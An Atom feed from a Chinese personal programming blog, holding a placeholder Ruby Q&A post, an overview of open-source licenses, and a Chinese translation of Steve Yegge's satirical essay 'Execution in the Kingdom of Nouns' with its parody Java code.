<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 
 <title>张华宁的笔记本</title>
 <link href="http://izhanghuaning.github.io/" rel="self"/>
 <link href="http://izhanghuaning.github.io"/>
 <updated>2014-07-15T16:37:12+08:00</updated>
 <id>http://izhanghuaning.github.io</id>
 <author>
   <name>张华宁</name>
   <email>izhanghuaning$163.com</email>
 </author>

 
 <entry>
   <title>BW编程ruby入门之对象</title>
   <link href="http://izhanghuaning.github.io/2012/05/05/pgrb-chap1-introduction.html"/>
   <updated>2012-05-05T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2012/05/05/pgrb-chap1-introduction</id>
   <content type="html">&lt;h4 id=&quot;white_js&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_2&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_3&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_4&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_5&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_6&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_7&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_8&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js_9&quot;&gt;White: js如何选取文档元素？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程《programming ruby》篇概述</title>
   <link href="http://izhanghuaning.github.io/2012/05/01/pgrb-introduction.html"/>
   <updated>2012-05-01T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2012/05/01/pgrb-introduction</id>
   <content type="html">&lt;h4 id=&quot;whitebw&quot;&gt;White：为什么这个系列都有个BW编程？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 这个系列是通过white和black的问答方式讲解一些javascript的知识。借用现在流行的结对编程的概念（虽然结对编程2个人技术能力相差太大不好），更确切的说是借鉴“师傅带徒弟”的方式吧。&lt;/p&gt;

&lt;p&gt;white是一个虚心好学的新人，刚踏上初级程序员的工作岗位，对编程认识和理解比较少，喜欢提问题。&lt;/p&gt;

&lt;p&gt;black是一个工作5年左右的程序员，喜欢读书和钻研技术，也喜欢分享知识，崇尚“共享、免费、提倡自由、平等”的古老精神。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitepgrb&quot;&gt;White：类别“pgrb”是什么意思？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; pgrb是ruby的“镐头书”《programming ruby 1.9 &amp;amp; 2.0》的缩写，本系列基本是按照《programming ruby》的顺序讲解ruby的基础知识。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>(转载)开源协议简介</title>
   <link href="http://izhanghuaning.github.io/2012/04/25/license-introduction.html"/>
   <updated>2012-04-25T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2012/04/25/license-introduction</id>
   <content type="html">&lt;p&gt;原文请参见&lt;a href=&quot;http://www.oschina.net/question/54100_9455&quot;&gt;五种开源协议(GPL,LGPL,BSD,MIT,Apache)&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;&quot;&gt;什么是许可协议？&lt;/h4&gt;

&lt;p&gt;什么是许可，当你为你的产品签发许可，你是在出让自己的权利，不过，你仍然拥有版权和专利（如果申请了的话），许可的目的是，向使用你产品的人提供 一定的权限。&lt;/p&gt;

&lt;p&gt;不管产品是免费向公众分发，还是出售，制定一份许可协议非常有用，否则，对于前者，你相当于放弃了自己所有的权利，任何人都没有义务表明你的原始作 者身份，对于后者，你将不得不花费比开发更多的精力用来逐个处理用户的授权问题。&lt;/p&gt;

&lt;p&gt;而开源许可协议使这些事情变得简单，开发者很容易向一个项目贡献自己的代码，它还可以保护你原始作者的身份，使你 至少获得认可，开源许可协议还可以阻止其它人将某个产品据为己有。以下是开源界的 5 大许可协议。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;gnu_gpl&quot;&gt;GNU GPL&lt;/h4&gt;

&lt;p&gt;GNU General Public Licence (GPL) 有可能是开源界最常用的许可模式。GPL 保证了所有开发者的权利，同时为使用者提供了足够的复制，分发，修改的权利：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;可自由复制&lt;/p&gt;

&lt;p&gt;你可以将软件复制到你的电脑，你客户的电脑，或者任何地方。复制份数没有任何限制。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;可自由分发&lt;/p&gt;

&lt;p&gt;在你的网站提供下载，拷贝到U盘送人，或者将源代码打印出来从窗户扔出去（环保起见，请别这样做）。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;可以用来盈利&lt;/p&gt;

&lt;p&gt;你可以在分发软件的时候收费，但你必须在收费前向你的客户提供该软件的 GNU GPL 许可协议，以便让他们知道，他们可以从别的渠道免费得到这份软件，以及你收费的理由。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;可自由修改&lt;/p&gt;

&lt;p&gt;如果你想添加或删除某个功能，没问题，如果你想在别的项目中使用部分代码，也没问题，唯一的要求是，使用了这段代码的项目也必须使用 GPL 协议。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;需要注意的是，分发的时候，需要明确提供源代码和二进制文件，另外，用于某些程序的某些协议有一些问题和限制，你可以看一下 @PierreJoye 写的 Practical Guide to GPL Compliance 一文。使用 GPL 协议，你必须在源代码代码中包含相应信息，以及协议本身。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;gnu_lgpl&quot;&gt;GNU LGPL&lt;/h4&gt;

&lt;p&gt;GNU 还有另外一种协议，叫做 LGPL （Lesser General Public Licence），它对产品所保留的权利比 GPL 少，总的来说，LGPL 适合那些用于非 GPL 或非开源产品的开源类库或框架。因为 GPL 要求，使用了 GPL 代码的产品必须也使用 GPL 协议，开发者不允许将 GPL 代码用于商业产品。LGPL 绕过了这一限制。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;bsd&quot;&gt;BSD&lt;/h4&gt;

&lt;p&gt;BSD 在软件分发方面的限制比别的开源协议（如 GNU GPL）要少。该协议有多种版本，最主要的版本有两个，新 BSD 协议与简单 BSD 协议，这两种协议经过修正，都和 GPL 兼容，并为开源组织所认可。&lt;/p&gt;

&lt;p&gt;新 BSD 协议（3条款协议）在软件分发方面，除需要包含一份版权提示和免责声明之外，没有任何限制。另外，该协议还禁止拿开发者的名义为衍生产品背书，但简单 BSD 协议删除了这一条款。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;mit&quot;&gt;MIT&lt;/h4&gt;

&lt;p&gt;MIT 协议可能是几大开源协议中最宽松的一个，核心条款是：&lt;/p&gt;

&lt;p&gt;该软件及其相关文档对所有人免费，可以任意处置，包括使用，复制，修改，合并，发表，分发，再授权，或者销售。唯一的限制是，软件中必须包含上述版 权和许可提示。&lt;/p&gt;

&lt;p&gt;这意味着：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;你可以自由使用，复制，修改，可以用于自己的项目。&lt;/li&gt;

&lt;li&gt;可以免费分发或用来盈利。&lt;/li&gt;

&lt;li&gt;唯一的限制是必须包含许可声明。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;MIT 协议是所有开源许可中最宽松的一个，除了必须包含许可声明外，再无任何限制。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;apache&quot;&gt;Apache&lt;/h4&gt;

&lt;p&gt;Apache 协议 2.0 和别的开源协议相比，除了为用户提供版权许可之外，还有专利许可，对于那些涉及专利内容的开发者而言，该协议最适合。&lt;/p&gt;

&lt;p&gt;Apache 协议还有以下需要说明的地方:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;永久权利&lt;/p&gt;

&lt;p&gt;一旦被授权，永久拥有。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;全球范围的权利&lt;/p&gt;

&lt;p&gt;在一个国家获得授权，适用于所有国家。假如你在美国，许可是从印度授权的，也没有问题。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;授权免费，且无版税&lt;/p&gt;

&lt;p&gt;前期，后期均无任何费用。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;授权无排他性&lt;/p&gt;

&lt;p&gt;任何人都可以获得授权&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;授权不可撤消&lt;/p&gt;

&lt;p&gt;一旦获得授权，没有任何人可以取消。比如，你基于该产品代码开发了衍生产品，你不用担心会在某一天被禁止使用该代码。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;分发代码方面包含一些要求，主要是，要在声明中对参与开发的人给予认可并包含一份许可协议原文。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;creative_commons&quot;&gt;Creative Commons&lt;/h4&gt;

&lt;p&gt;Creative Commons (CC) 并非严格意义上的开源许可，它主要用于设计。Creative Commons 有多种协议，每种都提供了相应授权模式，CC 协议主要包含 4 种基本形式：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;署名权&lt;/p&gt;

&lt;p&gt;必须为原始作者署名，然后才可以修改，分发，复制。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;保持一致&lt;/p&gt;

&lt;p&gt;作品同样可以在 CC 协议基础上修改，分发，复制。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;非商业&lt;/p&gt;

&lt;p&gt;作品可以被修改，分发，复制，但不能用于商业用途。但商业的定义有些模糊，比如，有的人认为非商业用途指的是不能销售，有的认为是甚至不能放在有广告的网 站，也有人认为非商业的意思是非盈利。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;不能衍生新作品&lt;/p&gt;

&lt;p&gt;你可以复制，分发，但不能修改，也不能以此为基础创作自己的作品。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;这些许可形式可以结合起来用，其中最严厉的组合是“署名，非商用，不能衍生新作品”，意味着，你可以分享作品，但不能改动或以此盈利，而且必须为原 作者署名。在这种许可模式下，原始作者对作品还拥有完全的控制权，而最宽松的组合是“署名”，意味着，只要为原始作者署名了，就可以自由处置。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;最后在阮一峰博客发现一张图，真是千言万语不如一张图啊&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/license.png&quot; alt=&quot;&quot; title=&quot;如何选择开源协议&quot; /&gt;&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>(翻译)为什么java中继承是恶魔</title>
   <link href="http://izhanghuaning.github.io/2012/04/20/why-extends-is-evil.html"/>
   <updated>2012-04-20T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2012/04/20/why-extends-is-evil</id>
   <content type="html"></content>
 </entry>
 
 <entry>
   <title>(翻译)为什么java中getter和setter方法是恶魔</title>
   <link href="http://izhanghuaning.github.io/2012/04/15/why-gsetter-methods-are-evil.html"/>
   <updated>2012-04-15T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2012/04/15/why-gsetter-methods-are-evil</id>
   <content type="html"></content>
 </entry>
 
 <entry>
   <title>(翻译)java名词王国中的方法执行</title>
   <link href="http://izhanghuaning.github.io/2012/04/10/execution-in-kingdom-of-nouns.html"/>
   <updated>2012-04-10T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2012/04/10/execution-in-kingdom-of-nouns</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;本篇是翻译，向大师致敬，原文请参见&lt;a href=&quot;http://steve-yegge.blogspot.com/2006/03/execution-in-kingdom-of-nouns.html&quot;&gt;Execution in the Kingdom of Nouns&lt;/a&gt;。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;They&amp;#39;ve a temper, some of them—particularly verbs: they&amp;#39;re the proudest—adjectives you can do anything with, but not verbs—however, I can manage the whole lot of them! Impenetrability! That&amp;#39;s what I say!     — Humpty Dumpty（未翻译，请自己理解）&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hello, world! 我们今天将要听到一个关于邪恶的java国王和在java王国内灭绝verb（动词）的故事。&lt;/p&gt;

&lt;p&gt;警报：这个故事并没有一个好的结局。这个故事不是为了刺激你的心脏或者挑起嘴仗，如果你容易被冒犯，或者喜欢在博客评论中攻击与你不同意见的人，那么请你马上离开。&lt;/p&gt;

&lt;p&gt;在我们正式开始这个故事之前，我们先通过一个小故事理清一些概念问题。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;倒垃圾(The Garbage Overfloweth)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;所有的java公民都喜欢”用例”(use cases)，那么我们就从这样一个用例开始：XX，去倒垃圾。正如：“华宁，垃圾满出来了，快去倒垃圾。”&lt;/p&gt;

&lt;p&gt;如果你是一个正常的说汉语(English)的人，你被要求倒垃圾时，你可能会大致在头脑中进行这样的一些步骤（action）。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;从垃圾桶中拿出垃圾袋
走出房间
把垃圾待扔到垃圾站
回来
洗手
坐到沙发上
继续干自己要做的事&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;即使你不是用汉语思考，那么这些场景也是类似的。无论你选择什么语言，或者你的具体行为步骤（action）是什么。倒垃圾都是把垃圾带出去，然后回到家里。&lt;/p&gt;

&lt;p&gt;我们的头脑中充满着勇敢、凶猛、热情等等各种各样的行为：我们活着、我们呼吸、走路，说话、大笑、吼叫、希望、恐惧、吃、喝、玩、行，和我们倒垃圾等等。以上所有的都是我们自由的去做（do）和表现（act）。如果我们都只能坐在阳光（in the sun）下的石头上，生活可能也还可以。但是我们将不再自由，我们的自由是来自于我们能够做(do)事情能够的能力。&lt;/p&gt;

&lt;p&gt;当然，我们的头脑中也充满了名词。我们吃”名词”、买名词、坐在名词上，睡在名词上等等一大堆名词。名词代表了某种存在，如果没有名词那么我们现在是在哪里呢？名词也仅仅代表东西，一种终态的存在。那有个建筑物，这有个岩石。小孩子都能说出这些名词。名词很简单，发生这些名词上的变化才让一切更加奇妙。&lt;/p&gt;

&lt;p&gt;变化则需要行为。行为是生活的调味料，行为让生活更精彩。毕竟如果你不去吃的话，永远不知道梨子有多么甜。名词一直存在着，是动词（行为）让生活不停的变化着，精彩着。&lt;/p&gt;

&lt;p&gt;当然还存在形容词、介词、代词等等让我们思考和表达这个世界的语言构成，它们都发挥着自己的作用，都非常重要，都是不可或缺的，但是我们主要考虑的是名词和动词，它们是今天故事的主角。&lt;/p&gt;

&lt;p&gt;如果说我们的语言中突然没有了动词会不会是特别奇怪或者无法理解的呢？？&lt;/p&gt;

&lt;p&gt;让我们回到故事的起点，java名词王国的故事。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;名词王国（The Kingdom of Nouns）&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在那遥远的java王国，国王java用“silcon fist”的强大武器进行着统治。这里的人民被禁止思考如何做事情。在java王国中，因为国王的关系，名词是最重要的一等公民。名词们四处巡视，身着华丽服饰的名词们看起来相当杰出，这些华丽服饰是由形容词提供的，形容词的使命就是让名词的生活更安心。形容词是二等公民，永远不能如名词高贵，但是它们至少庆幸的是它们不是动词。&lt;/p&gt;

&lt;p&gt;java王国的动词是悲惨的代名词，它们是名词的奴隶，没有自由。&lt;/p&gt;

&lt;p&gt;在java王国中，由国王颁布的“java法典”规定：动词归名词所有，但是又不仅仅像宠物那样，而是像奴隶。java王国的所有工作和劳动都是由动词做的。java王国的居民（包括动词）对此也习以为常，根本没有人意识到其实可以有另一种样子（动词可以是自由的一等公民）。&lt;/p&gt;

&lt;p&gt;java王国的动词们做了所有的工作和劳动，但是仍然被所有人蔑视，甚至连自由走动的权利都没有。如果动词出现在公共场合，它一定是被名词用绳子拴着（如同遛狗）。&lt;/p&gt;

&lt;p&gt;当然“拴”本身也是一个动词，是很难被允许单独出现的。它也必须被“监护者（Apply、Call）”拴（管理）着。“监护者”到底该怎么办呢？现实的情况是“监护者”也是名词，它们的职责就是监管低等的动词。&lt;em&gt;（译注：这段翻译不通畅，简单说就是java中通过点号（.拴）来调用方法，而点号（拴）本身也是一个方法，点号这个方法的调用是通过“监护者”来调用的，“监护着”的调用方法具体怎么实现，或许是编译器来实现的，根据计算机知识推理来说应该就是定位方法的地址吧，具体怎样有待考证。）&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;java国王，在处理动词的事情上与他们的太阳神（Sun God）进行沟通后，多次威胁要在java王国内取消掉所有的动词。如果这一天真的来临，那么java王国的居民们至少还要一个动词来完成所有的工作。java国王，以他残酷的幽默感宣告他的选择一定会是“执行”的。&lt;/p&gt;

&lt;p&gt;动词“执行（execute）”，以及他的同义词们“run、start、go、justdoit、makeitso”等等所有的动词都可以被“执行者”的execute()所取代。需要服务？waiter.execute()。要刷牙？ToothBrusher(myTeeth).execute()。倒垃圾？TrashDisposalPlanExecutor.execute()。没有动词是安全得了，它们都可以被名词.execute()取代。&lt;em&gt;（译注：这段讲解的就是类似于命令模式(command pattern)吧）&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;java王国中的每一个角落，名词们高呼着热烈的口号迫害流放了动词们。虽然看起来java王国中还到处都有动词，有“倒垃圾、刷牙、服务“等等动词，但是如果你足够接近它们，看的足够仔细你会发现其中的秘密，这些动词只不过是名词们给execute()取了别名，其本质千篇一律的样子没有丝毫改变。当你观察”倒垃圾者.倒垃圾()、刷牙者.刷牙()“，你真正看到的是邪恶的java国王掩盖在名词衣服之下的executioners的军队。&lt;em&gt;（译注：本段说java只有一个动词就是execute，其他动词都是它执行者起的别名）&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;邻国的动词&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在java王国的邻国，比如ruby王国，倒垃圾就像汉语中所描述倒垃圾那样直接。而在java王国数据对象是名词，函数是动词，必须名词.动词()。而在ruby王国的文明中，名词和动词是平等的，可以根据他们的业务随意混合使用，不再有强制的隶属关系。&lt;/p&gt;

&lt;p&gt;在java王国的邻国：c王国、js王国、perl王国、ruby王国等等某人倒垃圾的步骤就是设计好一连串的动作。然后把这些动作按照顺序分配给某个人，倒垃圾的任务就会顺利完成，不需要多余的监管等步骤。&lt;/p&gt;

&lt;p&gt;这些王国中不需要为动词创建作为“监管者”的名词。它们没有GarbageDisposalStrategy名词，也不需要GarbageDisposalDestinationLocator名词去寻找道路，或者PostGarbageActionCallback名词让你返回沙发。它们就是简单的定义好操作名词的行为动作，然后通过一个大的动作take_out_garbage()把子步骤按照正确顺序组合起来就可以了。&lt;em&gt;（译注：这里指倒垃圾这个过程涉及到多个对象（垃圾、房间、垃圾站、返回等等），在java中需要创建多个对象来实现这个过程。而在ruby等只需要定义好每个动作，然后顺序调用动作就可以了，不需要创建多余的对象）&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;在ruby等王国中如果需要名词的话，也是提供了实现的机制。如果ruby王国的发明家们创建了全新的、有用的、从未存在的概念，比如说一座房子、一个车子或者一个比牛耕地更块的机器，发明家们就类Class来表示它，它有自己的名字、描述、状态和行为。&lt;/p&gt;

&lt;p&gt;那么这样子不是和java国王的一样了么？它们的区别在哪里呢？ruby王国和java王国的区别在于，ruby王国中动词是和名词一样的一等公民，是可以单独存在的，不是名词的奴隶。&lt;/p&gt;

&lt;p&gt;java王国的人们鄙视着ruby王国。这就是语言王国们之间的语言优劣之争，从未停止，也不会消失。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;如果你挖的坑够深的话&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;凡是有阴就有阳，谁能想到语言大陆上还存在着另外一些王国比如Haskellia、Schema等等，这些王国是函数式编程王国，这这些王国动词是超然存在的公民。他们很少接近java王国，因为他们并不接壤，但是因为同情java王国动词们的遭遇，函数式王国联盟的人们仇视这java王国，正如果java王国同样仇视它们。争端的解决之道唯有语言优劣口水仗，别无它法。&lt;/p&gt;

&lt;p&gt;在schema王国等函数式王国联盟中，动词和名词基本上是平等的，各有分工。因为动词们实在太活跃了，相比而言名词基本是什么也不做。这里没有奇怪的法律规定动词必须被名词监管，所以只会按需创建名词。&lt;/p&gt;

&lt;p&gt;正是因为如此，如果你忽视了表达式的话，你会看到到处都是动词。从局外人的观点来看，在函数式王国联盟中动词是最重要的公民。也正是如此才被成为函数式（功能）王国联盟吧。&lt;/p&gt;

&lt;p&gt;当我们把目光投向更远方，越过函数式联盟的天之边际，存在着一个叫lambda王国的传说中的王国。在那里根本就没有名词，只有动词，所以被成为“终极动词王国”。这里也有“东西的存在”，但是这些存在都是动词创建的，即使基本如数字的存在，数字是在货币交易中最常用的，也是能把谎言说成真理的地方。数字0就是简单的lambda()，1就是lambda(lambda())依次类推。在这个王国的类似语名词的存在都是从最基本的动作lambda创建出来的。&lt;/p&gt;

&lt;p&gt;事实上，绝大多数java王国的公民不知道外面的世界是什么样子。如果知道的话会带来什么样的文化的冲击呢？很可能他们会匆忙的创建一些新的名词，比如“闭关锁国”、“仇外”等来表达自己的感受。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;java王国的公民幸福么？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;你可能认为java王国的日常生活最多有一点奇怪，最坏的是方面是非常低效的。但是如果你想知道一个国家到底是什么样子的，那么你应该听听那里的童谣是怎么唱的。在java王国，孩子们都在传唱这样一个童谣： &lt;em&gt;(译注：就是那个著名的将军输掉战争是因为一个马蹄钉的故事)&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;For the lack of a nail,
    throw new HorseshoeNailNotFoundException(&amp;quot;no nails!&amp;quot;);

For the lack of a horseshoe,
    EquestrianDoctor.getLocalInstance().getHorseDispatcher().shoot();

For the lack of a horse,
    RidersGuild.getRiderNotificationSubscriberList().getBroadcaster().run(
      new BroadcastMessage(StableFactory.getNullHorseInstance()));

For the lack of a rider,
    MessageDeliverySubsystem.getLogger().logDeliveryFailure(
      MessageFactory.getAbstractMessageInstance(
        new MessageMedium(MessageType.VERBAL),
        new MessageTransport(MessageTransportType.MOUNTED_RIDER),
        new MessageSessionDestination(BattleManager.getRoutingInfo(
                                        BattleLocation.NEAREST))),
      MessageFailureReasonCode.UNKNOWN_RIDER_FAILURE);

For the lack of a message,
    ((BattleNotificationSender)
      BattleResourceMediator.getMediatorInstance().getResource(
        BattleParticipant.PROXY_PARTICIPANT,
        BattleResource.BATTLE_NOTIFICATION_SENDER)).sendNotification(
          ((BattleNotificationBuilder)
            (BattleResourceMediator.getMediatorInstance().getResource(
            BattleOrganizer.getBattleParticipant(Battle.Participant.GOOD_GUYS),
            BattleResource.BATTLE_NOTIFICATION_BUILDER))).buildNotification(
              BattleOrganizer.getBattleState(BattleResult.BATTLE_LOST),
              BattleManager.getChainOfCommand().getCommandChainNotifier()));

For the lack of a battle,
    try {
        synchronized(BattleInformationRouterLock.getLockInstance()) {
          BattleInformationRouterLock.getLockInstance().wait();
        }
    } catch (InterruptedException ix) {
      if (BattleSessionManager.getBattleStatus(
           BattleResource.getLocalizedBattleResource(Locale.getDefault()),
           BattleContext.createContext(
             Kingdom.getMasterBattleCoordinatorInstance(
               new TweedleBeetlePuddlePaddleBattle()).populate(
                 RegionManager.getArmpitProvince(Armpit.LEFTMOST)))) ==
          BattleStatus.LOST) {
        if (LOGGER.isLoggable(Level.TOTALLY_SCREWED)) {
          LOGGER.logScrewage(BattleLogger.createBattleLogMessage(
            BattleStatusFormatter.format(BattleStatus.LOST_WAR,
                                         Locale.getDefault())));
        }
      }
    }

For the lack of a war,
    new ServiceExecutionJoinPoint(
      DistributedQueryAnalyzer.forwardQueryResult(
        NotificationSchemaManager.getAbstractSchemaMapper(
          new PublishSubscribeNotificationSchema()).getSchemaProxy().
            executePublishSubscribeQueryPlan(
              NotificationSchema.ALERT,
              new NotificationSchemaPriority(SchemaPriority.MAX_PRIORITY),
              new PublisherMessage(MessageFactory.getAbstractMessage(
                MessageType.WRITTEN,
                new MessageTransport(MessageTransportType.WOUNDED_SURVIVOR),
                new MessageSessionDestination(
                  DestinationManager.getNullDestinationForQueryPlan()))),
              DistributedWarMachine.getPartyRoleManager().getRegisteredParties(
                PartyRoleManager.PARTY_KING ||
                PartyRoleManager.PARTY_GENERAL ||
                PartyRoleManager.PARTY_AMBASSADOR)).getQueryResult(),
        PriorityMessageDispatcher.getPriorityDispatchInstance())).
      waitForService();&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All for the lack of a horseshoe nail.(缺少的仅仅是一个马蹄钉。)&lt;em&gt;(译注:创建了将军、战争、战斗、信息、通讯兵、马、马掌之后才发现没有创建马蹄钉，缺少马蹄钉导致了系统执行的失败。)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;这个童谣直到现在都是很有警示意义，被广泛流传。&lt;/p&gt;

&lt;p&gt;虽然java王国的童谣与弗兰克林的原版有些不同，但是java王国觉得他们的童谣有自己特别的魅力。&lt;/p&gt;

&lt;p&gt;主要的魅力是直观看到的上面高塔般的体系结构，这种体系结构被java国王特别推崇到很高的地位，因为这个体系结构完全由名词组成。众所周知，名词代表存在的事物（东西），并且在java王国名词被给予超过所有动词的重视。体系结构由可以看到的名词组成，堆砌起辉煌的高塔。所有的东西都发出令人愉悦的金属质感的声音当你用棍子敲击它们的时候。java国王非常喜欢这种金属质感的声音，他在踢新的马车的轮子的声音让他特别愉悦&lt;em&gt;(译注：这里影射java国王的怪癖)&lt;/em&gt;。不管有什么缺点，上面的童谣中并不缺乏名词。&lt;/p&gt;

&lt;p&gt;人类的本能之一就是寻求安全感。房子越坚固，我们就觉得越安全。在java王国，创造了太多的东西去令居民们感觉安全。他们惊叹这样的体系结构，并且认为这是一个“强大的设计”。当这个体系结构有任何变化时这种自豪的感觉被强化。这种体系结构强大到令人生畏的地步，以至于他们觉得没有人可以伤害它。&lt;/p&gt;

&lt;p&gt;作为这个强大的体系结构的好处，java王国的所有的事情都被很好的组织起来。你可以在任何需要地方发现适合的名词。所有的东西都是一成不变：表达式显式构造一个领域对象，抽象出一个管理器接口，实现管理器接口的run方法。java王国的居民们发现这样可以实现任何事情，只要有足够的名词，甚至还有一套“名词演算”的方法来支持抽象、计算过程。所有被需要的就是足够的名词，构造出那些名词，通过存取器（accessor）关联名词，还有最重要的execute()去执行他们的计划。&lt;em&gt;(译注：如下面的代码所示)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;可以说：java王国的居民们不只是快乐，它们甚至是非常自豪的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;StateManager.getConsiderationSetter(“Noun Oriented Thinking”, State.HAMFUL).run()&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;正如上面java王国的表达方式，外面的人是这么表达的”Noun Oriented Thinking Considered Hamful”。&lt;/p&gt;

&lt;p&gt;面向对象编程把名词放到了首位。为什么要去关注长篇大论进行铺垫却不讲主题的演讲？为什么一个概念的优先级要高于其他？并不是面向对象突然让我们觉得动词不重要了，而是我们改变了观察的角度，从一个奇怪的角度看待问题了。正如我朋友Jacob Gabrielson曾经提到的，提倡“面向对象编程”就像提倡“面向内裤穿衣”。&lt;/p&gt;

&lt;p&gt;java的静态类型系统，就像其他类似的一样，存在着共享的问题。但是极致追求面向名词的想法处理处理并不是一点点麻烦。任何类型系统都要求你重构你的思维去适应系统，消除独立的动词是没有任何理由的一步。&lt;/p&gt;

&lt;p&gt;C++并不存在这样的问题，因为C++作为c语言的超集，允许单独的函数的存在。另外c++提供了不同的命名空间的抽象。java重用了类的概念去表示命名空间、用户定义类型、句法委托机制，可见性和作用域机制，还有除了这些的其他特性。&lt;/p&gt;

&lt;p&gt;不要误会。我不是在宣扬c++是好的。只是我觉得更加喜欢c++类型系统的灵活性，至少同java相比的情况下。c++也有自己问题，看起来合理的语句却难于找到出错的原因，可能会很难找到合适的“咒语”来表达c++中一个特定的想法。但是c++简洁表达想法的能力远远超过了java，起码在c++中有动词啊。谁会喜欢讲一个没有动词的语言呢。&lt;em&gt;（译注：c++可能不如java提供强大的类库吧，本人不懂c++。）&lt;/em&gt;&lt;/p&gt;

